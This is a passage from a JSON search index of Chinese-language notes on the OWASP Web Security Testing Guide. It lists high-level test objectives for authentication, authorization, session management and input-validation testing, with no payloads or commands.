\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u9519\u8bef\u4fe1\u606f\u662f\u5426\u5141\u8bb8\u8d26\u6237\u679a\u4e3e</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/","title":"4\u3001\u8ba4\u8bc1\u6d4b\u8bd5","text":"<p>4.4.1\u6d4b\u8bd5\u901a\u8fc7\u52a0\u5bc6\u901a\u9053\u4f20\u8f93\u7684\u51ed\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u7f51\u7ad9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u7528\u4f8b\u662f\u5426\u4f1a\u5bfc\u81f4\u670d\u52a1\u5668\u6216\u5ba2\u6237\u7aef\u5728\u4e0d\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\u4ea4\u6362\u51ed\u636e</li> </ul> <p>4.4.2\u6d4b\u8bd5\u9ed8\u8ba4\u51ed\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u679a\u4e3e\u9ed8\u8ba4\u51ed\u636e\u7684\u5e94\u7528\u7a0b\u5e8f\u5e76\u9a8c\u8bc1\u5b83\u4eec\u662f\u5426\u5b58\u5728\u3002</li> <li>[ ] \u68c0\u67e5\u548c\u8bc4\u4f30\u65b0\u7684\u7528\u6237\u8d26\u6237\uff0c\u4ee5\u53ca\u5b83\u4eec\u662f\u5426\u4f7f\u7528\u4efb\u4f55\u9ed8\u8ba4\u503c\u6216\u53ef\u8bc6\u522b\u6a21\u5f0f\u521b\u5efa\u7684</li> </ul> <p>4.4.3\u5f31\u9501\u673a\u5236\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u8d26\u6237\u9501\u5b9a\u673a\u5236\u7f13\u89e3\u66b4\u529b\u5bc6\u7801\u731c\u6d4b\u7684\u80fd\u529b</li> <li>[ ] \u8bc4\u4f30\u89e3\u9501\u673a\u5236\u5bf9\u672a\u7ecf\u6388\u6743\u7684\u8d26\u6237\u89e3\u9501\u7684\u62b5\u6297\u529b</li> </ul> <p>4.4.4\u6d4b\u8bd5\u7ed5\u8fc7\u8ba4\u8bc1\u6a21\u5f0f</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u4fdd\u8eab\u4efd\u9a8c\u8bc1\u5e94\u7528\u4e8e\u6240\u6709\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u670d\u52a1\u3002</li> </ul> <p>4.4.5\u6d4b\u8bd5\u8bb0\u4f4f\u5bc6\u7801\u6f0f\u6d1e</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u751f\u6210\u7684\u4f1a\u8bdd\u662f\u5426\u5f97\u5230\u5b89\u5168\u7ba1\u7406\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5c06\u7528\u6237\u7684\u51ed\u636e\u7f6e\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002</li> </ul> <p>4.4.6\u6d4b\u8bd5\u6d4f\u89c8\u5668\u7f13\u5b58\u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u654f\u611f\u4fe1\u606f</li> <li>[ ] \u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8bbf\u95ee</li> </ul> <p>4.4.7\u5f31\u53e3\u4ee4\u7b56\u7565\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_7","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u901a\u8fc7\u8bc4\u4f30\u5bc6\u7801\u7684\u957f\u5ea6\u3001\u590d\u6742\u6027\u3001\u91cd\u7528\u548c\u8001\u5316\u8981\u6c42\uff0c\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u5bf9\u4f7f\u7528\u53ef\u7528\u5bc6\u7801\u5b57\u5178\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u731c\u6d4b\u7684\u62b5\u6297\u529b</li> </ul> <p>4.4.8\u5f31\u5b89\u5168\u95ee\u9898\u7b54\u6848\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_8","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u95ee\u9898\u7684\u590d\u6742\u6027\u548c\u7b80\u5355\u7a0b\u5ea6</li> <li>[ ] \u8bc4\u4f30\u53ef\u80fd\u7684\u7528\u6237\u7b54\u6848\u548c\u5f3a\u529b\u80fd\u529b</li> </ul> <p>4.4.9\u6d4b\u8bd5\u5f31\u5bc6\u7801\u66f4\u6539\u6216\u91cd\u7f6e\u529f\u80fd</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_9","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7834\u574f\u8d26\u6237\u66f4\u6539\u8fc7\u7a0b\uff08\u5141\u8bb8\u67d0\u4eba\u66f4\u6539\u8d26\u6237\u5bc6\u7801\uff09\u7684\u62b5\u6297\u529b</li> <li>[ ] \u786e\u5b9a\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5bf9\u731c\u6d4b\u6216\u7ed5\u8fc7\u7684\u62b5\u6297\u529b</li> </ul> <p>4.4.10\u5728\u66ff\u4ee3\u901a\u9053\u4e2d\u6d4b\u8bd5\u8f83\u5f31\u7684\u8ba4\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_10","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u66ff\u4ee3\u8eab\u4efd\u9a8c\u8bc1\u6e20\u9053</li> <li>[ ] \u8bc4\u4f30\u6240\u4f7f\u7528\u7684\u5b89\u5168\u63aa\u65bd\u4ee5\u53ca\u66ff\u4ee3\u6e20\u9053\u4e0a\u662f\u5426\u5b58\u5728\u4efb\u4f55\u65c1\u8def</li> </ul> <p>4.4.11\u6d4b\u8bd5\u591a\u91cd\u8eab\u4efd\u9a8c\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_11","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684 MFA \u7c7b\u578b</li> <li>[ ] \u786e\u5b9a MFA \u5b9e\u65bd\u662f\u5426\u7a33\u5065\u4e14\u5b89\u5168</li> <li>[ ] \u5c1d\u8bd5\u7ed5\u8fc7 MFA</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/","title":"5\u3001\u6388\u6743\u6d4b\u8bd5","text":"<p>4.5.1\u6d4b\u8bd5\u76ee\u5f55\u904d\u5386\u6587\u4ef6\u5305\u542b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u4e0e\u8def\u5f84\u904d\u5386\u76f8\u5173\u7684\u6ce8\u5165\u70b9</li> <li>[ ] \u8bc4\u4f30\u7ed5\u8fc7\u6280\u672f\u5e76\u786e\u5b9a\u8def\u5f84\u904d\u5386\u7684\u8303\u56f4</li> </ul> <p>4.5.2\u7ed5\u8fc7\u6388\u6743\u6a21\u5f0f\u7684\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u6c34\u5e73\u6216\u5782\u76f4\u8bbf\u95ee</li> </ul> <p>4.5.3 \u6743\u9650\u63d0\u5347\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u4e0e\u6743\u9650\u64cd\u7eb5\u76f8\u5173\u7684\u6ce8\u5165\u70b9</li> <li>[ ] \u6a21\u7cca\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u5c1d\u8bd5\u7ed5\u8fc7\u5b89\u5168\u63aa\u65bd</li> </ul> <p>4.5.4\u6d4b\u8bd5\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u6d4b\u8bd5\u53ef\u80fd\u53d1\u751f\u5bf9\u8c61\u5f15\u7528\u7684\u70b9</li> <li>[ ] \u8bc4\u4f30\u8bbf\u95ee\u63a7\u5236\u63aa\u65bd\u4ee5\u53ca\u5b83\u4eec\u662f\u5426\u5bb9\u6613\u53d7\u5230 IDOR \u653b\u51fb</li> </ul> <p>4.5.5\u6d4b\u8bd5 OAuth \u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a OAuth2 \u5b9e\u73b0\u662f\u5426\u5bb9\u6613\u6536\u5230\u653b\u51fb\u6216\u4f7f\u7528\u5df2\u5f03\u7528\u6216\u81ea\u5b9a\u4e49\u7684\u5b9e\u73b0\u3002</li> </ul> <p>4.5.5.1\u6d4b\u8bd5 OAuth \u6388\u6743\u670d\u52a1\u5668\u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u6388\u6743\u670d\u52a1\u5668\u4e2d\u7684\u5f31\u70b9</li> </ul> <p>4.5.5.2\u6d4b\u8bd5 OAuth \u5ba2\u6237\u7aef\u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_7","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b OAuth \u5ba2\u6237\u7aef\u4e2d\u7684\u5f31\u70b9</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"6\u3001\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.6.1\u4f1a\u8bdd\u7ba1\u7406\u6a21\u5f0f\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u5c3d\u53ef\u80fd\u4e3a\u540c\u4e00\u7528\u6237\u548c\u4e0d\u540c\u7528\u6237\u6536\u96c6\u4f1a\u8bdd\u4ee4\u724c</li> <li>[ ] \u5206\u6790\u5e76\u786e\u4fdd\u5b58\u5728\u8db3\u591f\u7684\u968f\u673a\u6027\u6765\u963b\u6b62\u4f1a\u8bdd\u4f2a\u9020\u653b\u51fb</li> <li>[ ] \u4fee\u6539\u672a\u7b7e\u540d\u4e14\u5305\u542b\u53ef\u64cd\u7eb5\u4fe1\u606f\u7684 cookie</li> </ul> <p>4.6.2\u00a0Cookies \u5c5e\u6027\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u4fdd\u4e3a cookie \u8bbe\u7f6e\u6b63\u786e\u7684\u5b89\u5168\u914d\u7f6e</li> </ul> <p>4.6.3\u4f1a\u8bdd\u56fa\u5b9a\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u5206\u6790\u8ba4\u8bc1\u673a\u5236\u53ca\u5176\u6d41\u7a0b</li> <li>[ ] \u5f3a\u5236 cookie \u5e76\u8bc4\u4f30\u5f71\u54cd</li> </ul> <p>4.6.4\u6d4b\u8bd5\u66b4\u9732\u7684\u4f1a\u8bdd\u53d8\u91cf</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u4fdd\u5b9e\u65bd\u6b63\u786e\u7684\u52a0\u5bc6</li> <li>[ ] \u68c0\u67e5\u7f13\u5b58\u914d\u7f6e</li> <li>[ ] \u8bc4\u4f30\u901a\u9053\u548c\u65b9\u6cd5\u7684\u5b89\u5168\u6027</li> </ul> <p>4.6.5\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u662f\u5426\u53ef\u4ee5\u4ee3\u8868\u7528\u6237\u53d1\u8d77\u8bf7\u6c42</li> </ul> <p>4.6.6\u6d4b\u8bd5\u6ce8\u9500\u529f\u80fd</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u6ce8\u9500 UI</li> <li>[ ] \u5206\u6790\u4f1a\u8bdd\u8d85\u65f6\u4ee5\u53ca\u6ce8\u9500\u540e\u4f1a\u8bdd\u662f\u5426\u88ab\u6b63\u786e\u7ec8\u6b62</li> </ul> <p>4.6.7\u6d4b\u8bd5\u4f1a\u8bdd\u8d85\u65f6</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_7","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u786c\u4f1a\u8bdd\u8d85\u65f6</li> </ul> <p>4.6.8\u4f1a\u8bdd\u6df7\u6dc6\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_8","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u6240\u6709\u4f1a\u8bdd\u53d8\u91cf</li> <li>[ ] \u6253\u7834\u4f1a\u8bdd\u751f\u6210\u7684\u903b\u8f91\u6d41\u7a0b</li> </ul> <p>4.6.9\u4f1a\u8bdd\u52ab\u6301\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_9","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u6613\u53d7\u653b\u51fb\u7684\u4f1a\u8bdd cookie</li> <li>[ ] \u52ab\u6301\u6613\u53d7\u653b\u51fb\u7684 cookie \u5e76\u8bc4\u4f30\u98ce\u9669\u7ea7\u522b</li> </ul> <p>4.6.10\u6d4b\u8bd5 JSON Web \u4ee4\u724c</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_10","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a JWT \u662f\u5426\u66b4\u9732\u654f\u611f\u4fe1\u606f</li> <li>[ ] \u786e\u5b9a JWT \u662f\u5426\u53ef\u4ee5\u88ab\u7be1\u6539\u6216\u4fee\u6539</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/7%E3%80%81%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/","title":"7\u3001\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5","text":"<p>4.7.1\u53cd\u5c04\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/7%E3%80%81%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u54cd\u5e94\u4e2d\u53cd\u6620\u7684\u53d8\u91cf</li> <li>[ ] \u8bc4\u4f30\u5b83\u4eec\u63a5\u53d7\u7684\u8f93\u5165\u4ee5\u53ca\u8fd4\u56de\u65f6\u5e94\u7528\u7684\u7f16\u7801</li> </ul> <p>4.7.2\u6d4b\u8bd5\u5b58\u50a8\u7684\u8de8\u7ad9\u811a\u672c</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/7%E3%80%81%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u53cd\u6620\u5728\u5ba2\u6237\u7aef\u7684\u5b58\u50a8\u8f93\u5165\u3002</li> <li>[ ] \u8bc4\u4f30\u5b83\u4eec\u63a5\u53d7\u7684\u8f93\u5165\u4ee5\u53ca\u8fd4\u56de\u65f6\u5e94\u7528\u7684\u7f16\u7801\uff08\u5982\u679c\u6709\uff09\u3002</li> </ul> <p>4.7.3\u6d4b\u8bd5 HTTP \u52a8\u8bcd\u7be1\u6539</p> <p>Test HTTP Methods</p> <p>4.7.4\u00a0HTTP\u53c2\u6570\u6c61\u67d3\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u540e\u7aef\u548c\u4f7f\u7528\u7684\u89e3\u6790\u65b9\u6cd5\u3002 \u8bc4\u4f30\u6ce8\u5165\u70b9\u5e76\u5c1d\u8bd5\u4f7f\u7528 HPP \u7ed5\u8fc7\u8f93\u5165\u8fc7\u6ee4\u5668\u3002</p> <p>4.7.5\u00a0SQL \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u8bc6\u522b SQL \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5165\u7684\u4e25\u91cd\u7a0b\u5ea6\u4ee5\u53ca\u901a\u8fc7\u6ce8\u5165\u53ef\u4ee5\u5b9e\u73b0\u7684\u8bbf\u95ee\u7ea7\u522b\u3002</p> <ul> <li> <p>4.7.5.1\u00a0Oracle \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.2\u00a0MySQL \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.3\u00a0SQL Server \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.4\u6d4b\u8bd5 PostgreSQL</p> </li> <li> <p>4.7.5.5\u6d4b\u8bd5 MS Access</p> </li> <li> <p>4.7.5.6\u00a0NoSQL\u6ce8\u5165\u6d4b\u8bd5</p> </li> <li> <p>4.7.5.7\u00a0ORM\u6ce8\u5165\u6d4b\u8bd5</p> </li> <li> <p>4.7.5.8\u5ba2\u6237\u7aef\u6d4b\u8bd5</p> </li> </ul> <p>\u4ee5\u4e0b\u6d4b\u8bd5\u573a\u666f\u5c06\u9a8c\u8bc1\u662f\u5426\u8fdb\u884c\u4e86\u6b63\u786e\u7684\u8f93\u5165\u9a8c\u8bc1\u3002\u5982\u679c\u5b9e\u73b0\u5b58\u5728\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539\u6216\u5220\u9664\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u3002</p> <p>4.7.6\u6d4b\u8bd5 LDAP \u6ce8\u5165</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b LDAP \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5c04\u7684\u4e25\u91cd\u7a0b\u5ea6\u3002</p> <p>4.7.7\u00a0XML \u6ce8\u5165\u6d4b\u8bd5 https://tttang.com/archive/1813/#toc_xml</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b XML \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u53ef\u5b9e\u73b0\u7684\u653b\u51fb\u7c7b\u578b\u53ca\u5176\u4e25\u91cd\u6027\u3002</p> <p>4.7.8\u00a0SSI \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b SSI \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5c04\u7684\u4e25\u91cd\u7a0b\u5ea6\u3002</p> <p>4.7.9\u00a0XPath \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b XPATH \u6ce8\u5165\u70b9\u3002</p> <p>4.7.10\u00a0IMAP SMTP \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b IMAP/SMTP \u6ce8\u5165\u70b9\u3002 \u4e86\u89e3\u7cfb\u7edf\u7684\u6570\u636e\u6d41\u7a0b\u548c\u90e8\u7f72\u7ed3\u6784\u3002 \u8bc4\u4f30\u6ce8\u5165\u5f71\u54cd\u3002</p> <p>4.7.11\u4ee3\u7801\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u53ef\u5c06\u4ee3\u7801\u6ce8\u5165\u5e94\u7528\u7a0b\u5e8f\u7684\u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5c04\u4e25\u91cd\u7a0b\u5ea6\u3002</p> <ul> <li>4.7.11.1\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5</li> </ul> <p>\u8bc6\u522b\u6587\u4ef6\u5305\u542b\u70b9\u3002 \u8bc4\u4f30\u6f0f\u6d1e\u7684\u4e25\u91cd\u6027\u6216\u6f5c\u5728\u5f71\u54cd\u3002</p> <p>4.7.12\u547d\u4ee4\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u8bc6\u522b\u5e76\u8bc4\u4f30\u547d\u4ee4\u6ce8\u5165\u70b9\u3002</p> <p>4.7.13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u8bc4\u4f30\u5c06\u683c\u5f0f\u5b57\u7b26\u4e32\u8f6c\u6362\u8bf4\u660e\u7b26\u6ce8\u5165\u7528\u6237\u63a7\u5236\u7684\u5b57\u6bb5\u662f\u5426\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u4e0d\u826f\u884c\u4e3a\u3002</p> <p>4.7.14\u5b75\u5316\u6f0f\u6d1e\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u5df2\u5b58\u50a8\u7684\u8fdb\u6837\u5e76\u9700\u8981\u5bf9\u5df2\u5b58\u50a8\u7684\u8fdb\u6837\u6267\u884c\u8c03\u7528\u6b65\u9aa4\u3002 \u4e86\u89e3\u53ec\u56de\u6b65\u9aa4\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002 \u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u8bbe\u7f6e\u4fa6\u542c\u5668\u6216\u6fc0\u6d3b\u8c03\u7528\u6b65\u9aa4\u3002</p> <p>4.7.15\u00a0HTTP \u62c6\u5206\u8d70\u79c1\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc4\u4f30\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5bb9\u6613\u53d7\u5230\u5206\u88c2\uff0c\u786e\u5b9a\u53ef\u4ee5\u5b9e\u73b0\u54ea\u4e9b\u53ef\u80fd\u7684\u653b\u51fb\u3002 \u8bc4\u4f30\u901a\u4fe1\u94fe\u662f\u5426\u5bb9\u6613\u53d7\u5230\u8d70\u79c1\u7684\u5f71\u54cd\uff0c\u786e\u5b9a\u53ef\u4ee5\u5b9e\u73b0\u54ea\u4e9b\u53ef\u80fd\u7684\u653b\u51fb</p> <p>4.7.16\u6d4b\u8bd5 HTTP \u4f20\u5165\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u76d1\u89c6\u5bf9 Web \u670d\u52a1\u5668\u7684\u6240\u6709\u4f20\u5165\u548c\u4f20\u51fa HTTP \u8bf7\u6c42\uff0c\u4ee5\u68c0\u67e5\u4efb\u4f55\u53ef\u7591\u8bf7\u6c42\u3002 \u76d1\u63a7 HTTP \u6d41\u91cf\uff0c\u65e0\u9700\u66f4\u6539\u6700\u7ec8\u7528\u6237\u6d4f\u89c8\u5668\u4ee3\u7406\u6216\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>4.7.17\u4e3b\u673a\u5934\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc4\u4f30\u5e94\u7528\u7a0b\u5e8f\u4e2d\u662f\u5426\u52a8\u6001\u89e3\u6790\u4e3b\u673a\u6807\u5934\u3002 \u7ed5\u8fc7\u4f9d\u8d56\u6807\u5934\u7684\u5b89\u5168\u63a7\u5236\u3002</p> 